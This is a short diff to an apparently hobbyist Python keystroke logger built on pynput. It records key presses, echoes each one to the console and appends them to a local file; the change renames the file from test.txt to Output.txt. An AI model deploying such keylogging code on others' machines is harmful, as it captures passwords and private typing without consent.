@@ -1,9 +1,7 @@
-import pynput
 from pynput.keyboard import Key,Listener
 
 keys = []
 count = 0
-
 def on_press(key):
     global keys,count
     print("{0} pressed".format(key))
@@ -15,7 +13,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open("test.txt","a") as f:
+    with open("Output.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
